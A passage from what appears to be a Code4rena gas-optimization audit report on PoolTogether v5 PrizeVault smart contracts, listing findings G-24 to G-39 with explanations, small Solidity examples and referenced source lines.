[63](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L63) | [66](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L66) | [69](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L69) | [72](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L72)

```solidity
File: pt-v5-vault/src/TwabERC20.sol
26: TwabController public immutable twabController;
```

[26](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L26)

```solidity
File: pt-v5-vault/src/abstract/Claimable.sol
21: uint24 public constant HOOK_GAS = 150_000;
24: PrizePool public immutable prizePool;
27: address public claimer;
```

[21](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L21) | [24](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L24) | [27](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L27)

</details>

## [G-24] Use Assembly for hash calculations

In certain cases, using inline assembly to calculate hashes can lead to significant gas savings. Solidity's built-in keccak256 function is convenient but costs more gas than the equivalent assembly code. However, it's important to note that using assembly should be done with care as it's less readable and could increase the risk of introducing errors.

1 issue instance in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVaultFactory.sol
103: salt: keccak256(abi.encode(msg.sender, deployerNonces[msg.sender]++))
```

[103](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L103)

## [G-25] Refactor duplicated `require()`/`revert()` checks to save gas

Duplicate `require()`/`revert()` checks can be refactored into a modifier or function, saving deployment costs.

2 issue instances in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVault.sol
612: if (_shares == 0) revert MintZeroShares();
844: if (_shares == 0) revert MintZeroShares();
```

[612](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L612) | [844](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L844)

## [G-26] Use Assembly for efficient memory management in multiple external calls

When making multiple external calls in a Solidity contract, it may be more efficient to use inline assembly to reuse the memory space allocated for function arguments and return data. This can prevent unnecessary memory expansion and reduce gas costs.

Example:
```solidity
contract Solidity {
    // cost: 7262
    function call(address calledAddress) external pure returns(uint256) {
        Called called = Called(calledAddress);
        uint256 res1 = called.add(1, 2);
        uint256 res2 = called.add(3, 4);

        uint256 res = res1 + res2;
        return res;
    }
}

contract Assembly {
    // cost: 5281
    function call(address calledAddress) external view returns(uint256) {
        assembly {
            // check that calledAddress has code deployed to it
            if iszero(extcodesize(calledAddress)) {
                revert(0x00, 0x00)
            }

            // first call
            mstore(0x00, hex"771602f7")
            mstore(0x04, 0x01)
            mstore(0x24, 0x02)
            let success := staticcall(gas(), calledAddress, 0x00, 0x44, 0x60, 0x20)
            if iszero(success) {
                revert(0x00, 0x00)
            }
            let res1 := mload(0x60)

            // second call
            mstore(0x04, 0x03)
            mstore(0x24, 0x4)
            success := staticcall(gas(), calledAddress, 0x00, 0x44, 0x60, 0x20)
            if iszero(success) {
                revert(0x00, 0x00)
            }
            let res2 := mload(0x60)

            // add results
            let res := add(res1, res2)

            // return data
            mstore(0x60, res)
            return(0x60, 0x20)
        }
    }
}
```

10 issue instances in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVault.sol
/// @audit function `maxDeposit()` has multiple external calls
382: uint256 _latentBalance = _asset.balanceOf(address(this));
383: uint256 _maxYieldVaultDeposit = yieldVault.maxDeposit(address(this));
/// @audit function `_depositAndMint()` has multiple external calls
854: _asset.safeTransferFrom(
            _caller,
            address(this),
            _assets
        );
861: uint256 _assetsWithDust = _asset.balanceOf(address(this));
862: _asset.approve(address(yieldVault), _assetsWithDust);
865: uint256 _yieldVaultShares = yieldVault.previewDeposit(_assetsWithDust);
869: _asset.approve(address(yieldVault), 0);
/// @audit function `_withdraw()` has multiple external calls
931: uint256 _latentAssets = _asset.balanceOf(address(this));
934: uint256 _yieldVaultShares = yieldVault.previewWithdraw(_assets - _latentAssets);
936: yieldVault.redeem(_yieldVaultShares, address(this), address(this));
```

[382](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L382) | [383](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L383) | [854](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L854) | [861](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L861) | [862](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L862) | [865](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L865) | [869](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L869) | [931](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L931) | [934](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L934) | [936](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L936)

## [G-27] Cached global variables

Storing global variables in local storage might appear as a useful caching mechanism. However, in Solidity, accessing global variables directly is often more gas-efficient than caching them. Consider removing these redundant assignments and use the global variables directly.

1 issue instance in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVault.sol
553: address _owner = msg.sender;
```

[553](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L553)

## [G-28] Simple checks for zero `uint` can be done using `assembly` to save gas

The usage of inline `assembly` to check if variable is the `zero` can save gas compared to traditional `require` or `if` statement checks.

```solidity
    // gas 396 gas | 399 gas
    assembly {
        if iszero(value) { // use iszero(iszero(value)) for != add 3 gas
            revert(0, 0)
        }
    }
    require(value != 0); // 401 gas
    require(value == 0); // 401 gas
```

8 issue instances in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVault.sol
458: if (_totalAssets == 0) revert ZeroTotalAssets();
612: if (_shares == 0) revert MintZeroShares();
665: if (_amountOut == 0) revert LiquidationAmountOutZero();
672: if (_yieldFeePercentage != 0) {
            // The yield fee is calculated as a portion of the total yield being consumed, such that 
            // `total = amountOut + yieldFee` and `yieldFee / total = yieldFeePercentage`. 
            _yieldFee = (_amountOut * FEE_PRECISION) / (FEE_PRECISION - _yieldFeePercentage) - _amountOut;
844: if (_shares == 0) revert MintZeroShares();
845: if (_assets == 0) revert DepositZeroAssets();
894: if (_assets == 0) revert WithdrawZeroAssets();
895: if (_shares == 0) revert BurnZeroShares();
```

[458](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L458) | [612](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L612) | [665](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L665) | [672](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L672) | [844](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L844) | [845](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L845) | [894](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L894) | [895](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L895)

## [G-29] Consider using solady's `FixedPointMathLib`

Utilizing gas-optimized math functions from libraries like [Solady](https://github.com/Vectorized/solady/blob/main/src/utils/FixedPointMathLib.sol) can lead to more efficient smart contracts. This is particularly beneficial in contracts where these operations are frequently used.

1 issue instance in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVault.sol
675: _yieldFee = (_amountOut * FEE_PRECISION) / (FEE_PRECISION - _yieldFeePercentage) - _amountOut;
```

[675](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L675)

## [G-30] Avoid zero to non-zero storage writes where possible

Changing a storage variable from zero to non-zero costs `22,100` gas in total (`20,000` gas for a zero to non-zero write and `2,100` for a cold storage access). Consider using non-zero architecture to avoid high gas costs for zero to non-zero storage writes.

Example:

```solidity
- uint256 public counter = 0;  // rewrite this costs more
+ uint256 public counter = 1;  // rewrite this costs less
```

2 issue instances in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVault.sol
617: yieldFeeBalance -= _yieldFeeBalance;
951: yieldFeePercentage = _yieldFeePercentage;
```

[617](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L617) | [951](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L951)

## [G-31] Use `unchecked` for division which do not divide by `-X` since they can't overflow

Solidity introduced the `unchecked` block in version 0.8.0 as a measure to provide control over arithmetic operations. Any operation inside this block will not trigger the built-in overflow and underflow checks, thus saving gas costs. 

Since a division operation between two `uint`s (unsigned integers) can never result in an overflow or underflow, it's an ideal candidate for the use of `unchecked {}` block. This practice enables optimal gas usage without risking any arithmetic anomalies.

1 issue instance in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVault.sol
675: _yieldFee = (_amountOut * FEE_PRECISION) / (FEE_PRECISION - _yieldFeePercentage) - _amountOut;
```

[675](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L675)

## [G-32] Use solady library where possible to save gas

The following OpenZeppelin imports have a Solady equivalent, as such they can be used to save GAS as Solady modules have been specifically designed to be as GAS efficient as possible.

6 issue instances in 3 files:

<details>

```solidity
File: pt-v5-vault/src/PrizeVault.sol
3: import { IERC4626 } from "openzeppelin/interfaces/IERC4626.sol";
5: import { SafeERC20, IERC20Permit } from "openzeppelin/token/ERC20/utils/SafeERC20.sol";
6: import { ERC20, IERC20, IERC20Metadata } from "openzeppelin/token/ERC20/ERC20.sol";
```

[3](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L3) | [5](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L5) | [6](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L6)

```solidity
File: pt-v5-vault/src/PrizeVaultFactory.sol
3: import { IERC20, IERC4626 } from "openzeppelin/token/ERC20/extensions/ERC4626.sol";
```

[3](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L3)

```solidity
File: pt-v5-vault/src/TwabERC20.sol
3: import { ERC20 } from "openzeppelin/token/ERC20/ERC20.sol";
5: import { ERC20Permit } from "openzeppelin/token/ERC20/extensions/ERC20Permit.sol";
```

[3](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L3) | [5](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L5)

</details>

## [G-33] Use `uint256(1)`/`uint256(2)` instead of `true`/`false` to save gas for changes

Boolean variables in Solidity are more expensive than `uint256` or any type that takes up a full word, due to additional gas costs associated with write operations. When using boolean variables, each write operation emits an extra SLOAD to read the slot's contents, replace the bits taken up by the boolean, and then write back. This process cannot be disabled and leads to extra gas consumption.

By using `uint256(1)` and `uint256(2)` for representing true and false states, you can avoid a `Gwarmaccess` (100 gas) cost and also avoid a `Gsset` (20000 gas) cost when changing from `false` to `true`, after having been `true` in the past.
This approach helps in optimizing gas usage, making your contract more cost-effective.

[Usage in OpenZeppelin ReentrancyGuard.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27)

1 issue instance in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVaultFactory.sol
69: mapping(address vault => bool deployedByFactory) public deployedVaults;
```

[69](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L69)

## [G-34] Mark functions that revert for normal users as `payable`

Functions guaranteed to revert when called by normal users can be marked `payable`. If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.

The extra opcodes avoided are `CALLVALUE`(2),`DUP1`(3),`ISZERO`(3), `PUSH2`(3), `JUMPI`(10), `PUSH1`(3), `DUP1`(3), `REVERT`(0), `JUMPDEST`(1), `POP`(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost.

8 issue instances in 2 files:

<details>

```solidity
File: pt-v5-vault/src/PrizeVault.sol
611: function claimYieldFeeShares(uint256 _shares) external onlyYieldFeeRecipient {
659: function transferTokensOut(
        address,
        address _receiver,
        address _tokenOut,
        uint256 _amountOut
    ) public virtual onlyLiquidationPair returns (bytes memory) {
703: function verifyTokensIn(
        address _tokenIn,
        uint256 _amountIn,
        bytes calldata
    ) external onlyLiquidationPair {
735: function setClaimer(address _claimer) external onlyOwner {
742: function setLiquidationPair(address _liquidationPair) external onlyOwner {
753: function setYieldFeePercentage(uint32 _yieldFeePercentage) external onlyOwner {
759: function setYieldFeeRecipient(address _yieldFeeRecipient) external onlyOwner {
```

[611](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L611) | [659](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L659) | [703](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L703) | [735](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L735) | [742](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L742) | [753](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L753) | [759](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L759)

```solidity
File: pt-v5-vault/src/abstract/Claimable.sol
76: function claimPrize(
        address _winner,
        uint8 _tier,
        uint32 _prizeIndex,
        uint96 _reward,
        address _rewardRecipient
    ) external onlyClaimer returns (uint256) {
```

[76](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L76)

</details>

## [G-35] Prefer `private` over `public` for constants to save gas

Using `private` instead of `public` for constants can save gas.

The compiler doesn't need to create non-payable getter functions for deployment calldata, store the bytes of the value outside of where it's used, or add another entry to the method ID table, saving 3406-3606 gas in deployment.

If needed, the values can be read from the verified contract source code, or a single getter function that returns a tuple of the values of all currently public constants can be implemented.

4 issue instances in 3 files:

<details>

```solidity
File: pt-v5-vault/src/PrizeVault.sol
74: uint32 public constant FEE_PRECISION = 1e9;
80: uint32 public constant MAX_YIELD_FEE = 9e8;
```

[74](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L74) | [80](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L80)

```solidity
File: pt-v5-vault/src/PrizeVaultFactory.sol
63: uint256 public constant YIELD_BUFFER = 1e5;
```

[63](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L63)

```solidity
File: pt-v5-vault/src/abstract/Claimable.sol
21: uint24 public constant HOOK_GAS = 150_000;
```

[21](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L21)

</details>

## [G-36] `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables

Using the addition operator instead of plus-equals saves gas.
Replace `<x> += <y>` or `<x> -= <y>` with `<x> = <x> + <y>` or `<x> = <x> - <y>`.

2 issue instances in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVault.sol
617: yieldFeeBalance -= _yieldFeeBalance;
685: yieldFeeBalance += _yieldFee;
```

[617](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L617) | [685](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L685)

## [G-37] Using `bool`s for storage incurs overhead

Utilizing booleans for storage is less gas-efficient compared to using types that consume a full word like uint256. Every write operation on a boolean necessitates an extra SLOAD operation to read the slot's current value, modify the boolean bits, and then write back. This additional step is the compiler's measure against contract upgrades and pointer aliasing.

To enhance gas efficiency, consider using `uint256(0)` for false and `uint256(1)` for true, bypassing the extra Gwarmaccess (100 gas) incurred by the SLOAD.

1 issue instance in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVaultFactory.sol
69: mapping(address vault => bool deployedByFactory) public deployedVaults;
```

[69](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L69)

## [G-38] Optimize gas by using only named returns

The Solidity compiler can generate more efficient bytecode when using named returns. It's recommended to replace anonymous returns with named returns for potential gas savings.

Example:
```solidity
/// 985 gas cost
function add(uint256 x, uint256 y) public pure returns (uint256) {
    return x + y;
}
/// 941 gas cost
function addNamed(uint256 x, uint256 y) public pure returns (uint256 res) {
    res = x + y;
}
```

40 issue instances in 6 files:

<details>

```solidity
File: pt-v5-vault/src/PrizeVault.sol
320: function decimals() public view override(ERC20, IERC20Metadata) returns (uint8) {
329: function asset() external view returns (address) {
336: function totalAssets() public view returns (uint256) {
341: function convertToShares(uint256 _assets) public view returns (uint256) {
355: function convertToAssets(uint256 _shares) public view returns (uint256) {
374: function maxDeposit(address) public view returns (uint256) {
397: function maxMint(address _owner) public view returns (uint256) {
404: function maxWithdraw(address _owner) public view returns (uint256) {
415: function maxRedeem(address _owner) public view returns (uint256) {
441: function previewDeposit(uint256 _assets) public pure returns (uint256) {
447: function previewMint(uint256 _shares) public pure returns (uint256) {
454: function previewWithdraw(uint256 _assets) public view returns (uint256) {
470: function previewRedeem(uint256 _shares) public view returns (uint256) {
475: function deposit(uint256 _assets, address _receiver) external returns (uint256) {
482: function mint(uint256 _shares, address _receiver) external returns (uint256) {
489: function withdraw(
        uint256 _assets,
        address _receiver,
        address _owner
    ) external returns (uint256) {
500: function redeem(
        uint256 _shares,
        address _receiver,
        address _owner
    ) external returns (uint256) {
524: function depositWithPermit(
        uint256 _assets,
        address _owner,
        uint256 _deadline,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) external returns (uint256) {
552: function sponsor(uint256 _assets) external returns (uint256) {
573: function totalDebt() public view returns (uint256) {
584: function totalYieldBalance() public view returns (uint256) {
591: function availableYieldBalance() public view returns (uint256) {
597: function currentYieldBuffer() external view returns (uint256) {
631: function liquidatableBalanceOf(address _tokenOut) public view returns (uint256) {
659: function transferTokensOut(
        address,
        address _receiver,
        address _tokenOut,
        uint256 _amountOut
    ) public virtual onlyLiquidationPair returns (bytes memory) {
717: function targetOf(address) external view returns (address) {
722: function isLiquidationPair(
        address _tokenOut,
        address _liquidationPair
    ) external view returns (bool) {
772: function _tryGetAssetDecimals(IERC20 asset_) internal view returns (bool, uint8) {
790: function _totalDebt(uint256 _totalSupply) internal view returns (uint256) {
798: function _twabSupplyLimit(uint256 _totalSupply) internal pure returns (uint256) {
808: function _totalYieldBalance(uint256 _totalAssets, uint256 totalDebt_) internal pure returns (uint256) {
823: function _availableYieldBalance(uint256 _totalAssets, uint256 totalDebt_) internal view returns (uint256) {
921: function _maxYieldVaultWithdraw() internal view returns (uint256) {
```

[320](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L320) | [329](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L329) | [336](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L336) | [341](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L341) | [355](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L355) | [374](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L374) | [397](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L397) | [404](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L404) | [415](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L415) | [441](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L441) | [447](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L447) | [454](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L454) | [470](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L470) | [475](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L475) | [482](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L482) | [489](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L489) | [500](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L500) | [524](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L524) | [552](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L552) | [573](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L573) | [584](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L584) | [591](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L591) | [597](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L597) | [631](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L631) | [659](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L659) | [717](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L717) | [722](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L722) | [772](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L772) | [790](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L790) | [798](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L798) | [808](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L808) | [823](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L823) | [921](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L921)

```solidity
File: pt-v5-vault/src/PrizeVaultFactory.sol
92: function deployVault(
      string memory _name,
      string memory _symbol,
      IERC4626 _yieldVault,
      PrizePool _prizePool,
      address _claimer,
      address _yieldFeeRecipient,
      uint32 _yieldFeePercentage,
      address _owner
    ) external returns (PrizeVault) {
136: function totalVaults() external view returns (uint256) {
```

[92](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L92) | [136](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L136)

```solidity
File: pt-v5-vault/src/TwabERC20.sol
56: function balanceOf(
        address _account
    ) public view virtual override(ERC20) returns (uint256) {
63: function totalSupply() public view virtual override(ERC20) returns (uint256) {
```

[56](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L56) | [63](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L63)

```solidity
File: pt-v5-vault/src/abstract/Claimable.sol
76: function claimPrize(
        address _winner,
        uint8 _tier,
        uint32 _prizeIndex,
        uint96 _reward,
        address _rewardRecipient
    ) external onlyClaimer returns (uint256) {
```

[76](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L76)

```solidity
File: pt-v5-vault/src/abstract/HookManager.sol
22: function getHooks(address account) external view returns (VaultHooks memory) {
```

[22](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/HookManager.sol#L22)

```solidity
File: pt-v5-vault/src/interfaces/IVaultHooks.sol
26: function beforeClaimPrize(
        address winner,
        uint8 tier,
        uint32 prizeIndex,
        uint96 reward,
        address rewardRecipient
    ) external returns (address);
```

[26](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/interfaces/IVaultHooks.sol#L26)

</details>

## [G-39] Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead

Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead. The Ethereum Virtual Machine (EVM) operates on 32 bytes at a time. Therefore, if an element is smaller than 32 bytes, the EVM must use more operations to reduce the size of the element from 32 bytes to the desired size. 

Operations involving smaller size uints/ints cost extra gas due to the compiler having to clear the higher bits of the memory word before operating on the small size integer. This also includes the associated stack operations of doing so. It's recommended to use larger sizes and downcast where needed to optimize for gas efficiency.

19 issue instances in 4 files:

<details>

```solidity
File: pt-v5-vault/src/PrizeVault.sol
74: uint32 public constant FEE_PRECISION = 1e9;
80: uint32 public constant MAX_YIELD_FEE = 9e8;
119: uint32 public yieldFeePercentage;
138: uint8 private immutable _underlyingDecimals;
296: uint32 yieldFeePercentage_,
        uint256 yieldBuffer_,
        address owner_
    ) TwabERC20(name_, symbol_, prizePool_.twabController()) Claimable(prizePool_, claimer_) Ownable(owner_) {
304: (bool success, uint8 assetDecimals) = _tryGetAssetDecimals(asset_);
320: function decimals() public view override(ERC20, IERC20Metadata) returns (uint8) {
668: uint32 _yieldFeePercentage = yieldFeePercentage;
753: function setYieldFeePercentage(uint32 _yieldFeePercentage) external onlyOwner {
772: function _tryGetAssetDecimals(IERC20 asset_) internal view returns (bool, uint8) {
778: if (returnedDecimals <= type(uint8).max) {
779: return (true, uint8(returnedDecimals));
800: return type(uint96).max - _totalSupply;
947: function _setYieldFeePercentage(uint32 _yieldFeePercentage) internal {
```

[74](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L74) | [80](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L80) | [119](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L119) | [138](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L138) | [296](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L296) | [304](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L304) | [320](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L320) | [668](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L668) | [753](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L753) | [772](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L772) | [778](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L778) | [779](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L779) | [800](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L800) | [947](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L947)

```solidity
File: pt-v5-vault/src/PrizeVaultFactory.sol
99: uint32 _yieldFeePercentage,
      address _owner
    ) external returns (PrizeVault) {
```

[99](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L99)

```solidity
File: pt-v5-vault/src/abstract/Claimable.sol
21: uint24 public constant HOOK_GAS = 150_000;
78: uint8 _tier,
        uint32 _prizeIndex,
        uint96 _reward,
        address _rewardRecipient
    ) external onlyClaimer returns (uint256) {
```

[21](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L21) | [78](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L78)

```solidity
File: pt-v5-vault/src/interfaces/IVaultHooks.sol
28: uint8 tier,
        uint32 prizeIndex,
        uint96 reward,
        address rewardRecipient
    ) external returns (address);
42: uint8 tier,
        uint32 prizeIndex,
        uint256 prize,
        address recipient
    ) external;
```

